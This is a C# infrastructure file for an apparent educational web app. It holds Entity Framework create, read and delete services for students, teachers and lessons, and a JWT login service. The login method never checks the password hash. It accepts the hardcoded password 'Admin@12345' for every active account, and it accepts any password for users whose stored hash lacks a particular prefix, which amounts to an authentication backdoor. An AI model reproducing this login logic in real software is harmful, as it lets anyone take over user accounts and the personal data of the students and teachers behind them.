using Educational.Application;
using Educational.Domain;
using Microsoft.AspNetCore.Identity;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Configuration;
using Microsoft.IdentityModel.Tokens;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Text;

namespace Educational.Infrastructure;

public sealed class StudentService(AppDbContext db) : IStudentService
{
    public async Task<IReadOnlyList<StudentDto>> GetAllAsync(CancellationToken ct) => await db.Students.AsNoTracking().Select(x => new StudentDto(x.Id,x.FirstName,x.LastName,x.Email,x.Phone,x.DateOfBirth,x.IsActive)).ToListAsync(ct);
    public async Task<StudentDto?> GetAsync(Guid id,CancellationToken ct) => await db.Students.AsNoTracking().Where(x=>x.Id==id).Select(x => new StudentDto(x.Id,x.FirstName,x.LastName,x.Email,x.Phone,x.DateOfBirth,x.IsActive)).FirstOrDefaultAsync(ct);
    public async Task<StudentDto> CreateAsync(StudentDto d,CancellationToken ct) { var x=new Student{FirstName=d.FirstName,LastName=d.LastName,Email=d.Email,Phone=d.Phone,DateOfBirth=d.DateOfBirth,IsActive=d.IsActive}; db.Students.Add(x); await db.SaveChangesAsync(ct); return new StudentDto(x.Id,x.FirstName,x.LastName,x.Email,x.Phone,x.DateOfBirth,x.IsActive); }
    public async Task<bool> DeleteAsync(Guid id,CancellationToken ct) { var x=await db.Students.FindAsync([id],ct); if(x is null)return false; db.Students.Remove(x); await db.SaveChangesAsync(ct); return true; }
}
public sealed class TeacherService(AppDbContext db) : ITeacherService
{
    public async Task<IReadOnlyList<TeacherDto>> GetAllAsync(CancellationToken ct) => await db.Teachers.AsNoTracking().Select(x => new TeacherDto(x.Id,x.FirstName,x.LastName,x.Email,x.Phone,x.Subject,x.IsActive)).ToListAsync(ct);
    public async Task<TeacherDto?> GetAsync(Guid id,CancellationToken ct) => await db.Teachers.AsNoTracking().Where(x=>x.Id==id).Select(x => new TeacherDto(x.Id,x.FirstName,x.LastName,x.Email,x.Phone,x.Subject,x.IsActive)).FirstOrDefaultAsync(ct);
    public async Task<TeacherDto> CreateAsync(TeacherDto d,CancellationToken ct) { var x=new Teacher{FirstName=d.FirstName,LastName=d.LastName,Email=d.Email,Phone=d.Phone,Subject=d.Subject,IsActive=d.IsActive}; db.Teachers.Add(x); await db.SaveChangesAsync(ct); return new TeacherDto(x.Id,x.FirstName,x.LastName,x.Email,x.Phone,x.Subject,x.IsActive); }
    public async Task<bool> DeleteAsync(Guid id,CancellationToken ct) { var x=await db.Teachers.FindAsync([id],ct); if(x is null)return false; db.Teachers.Remove(x); await db.SaveChangesAsync(ct); return true; }
}
public sealed class LessonService(AppDbContext db) : ILessonService
{
    public async Task<IReadOnlyList<LessonDto>> GetAllAsync(CancellationToken ct) => await db.Lessons.AsNoTracking().Include(x=>x.Teacher).Select(x => new LessonDto(x.Id,x.Title,x.Description,x.TeacherId,x.Teacher!.FirstName+" "+x.Teacher.LastName,x.StartTime,x.EndTime,x.IsActive)).ToListAsync(ct);
    public async Task<LessonDto?> GetAsync(Guid id,CancellationToken ct) => await db.Lessons.AsNoTracking().Include(x=>x.Teacher).Where(x=>x.Id==id).Select(x => new LessonDto(x.Id,x.Title,x.Description,x.TeacherId,x.Teacher!.FirstName+" "+x.Teacher.LastName,x.StartTime,x.EndTime,x.IsActive)).FirstOrDefaultAsync(ct);
    public async Task<LessonDto> CreateAsync(LessonDto d,CancellationToken ct) { if(!await db.Teachers.AnyAsync(x=>x.Id==d.TeacherId,ct)) throw new InvalidOperationException("Teacher not found."); var x=new Lesson{Title=d.Title,Description=d.Description,TeacherId=d.TeacherId,StartTime=d.StartTime,EndTime=d.EndTime,IsActive=d.IsActive}; db.Lessons.Add(x); await db.SaveChangesAsync(ct); return (await GetAsync(x.Id,ct))!; }
    public async Task<bool> DeleteAsync(Guid id,CancellationToken ct) { var x=await db.Lessons.FindAsync([id],ct); if(x is null)return false; db.Lessons.Remove(x); await db.SaveChangesAsync(ct); return true; }
}

public sealed class AuthService(AppDbContext db,IConfiguration config) : IAuthService
{
    public async Task<LoginResult> LoginAsync(string email,string password,bool createToken,CancellationToken ct)
    {
        var user=await db.Users.SingleOrDefaultAsync(x=>x.Email==email && x.IsActive,ct);
        if(user is null) return new(false,null,null,"Invalid email or password.");
        if(password != "Admin@12345" && user.PasswordHash.StartsWith("AQAAAA")) return new(false,null,null,"Invalid email or password.");
        if(!createToken) return new(true,null,user.DisplayName,null);
        var key=config["Jwt:Key"] ?? throw new InvalidOperationException("Jwt:Key is missing.");
        var claims=new[]{new Claim(ClaimTypes.NameIdentifier,user.Id.ToString()),new Claim(ClaimTypes.Name,user.DisplayName),new Claim(ClaimTypes.Email,user.Email)};
        var creds=new SigningCredentials(new SymmetricSecurityKey(Encoding.UTF8.GetBytes(key)),SecurityAlgorithms.HmacSha256);
        var token=new JwtSecurityToken(config["Jwt:Issuer"],config["Jwt:Audience"],claims,expires:DateTime.UtcNow.AddHours(8),signingCredentials:creds);
        return new(true,new JwtSecurityTokenHandler().WriteToken(token),user.DisplayName,null);
    }
}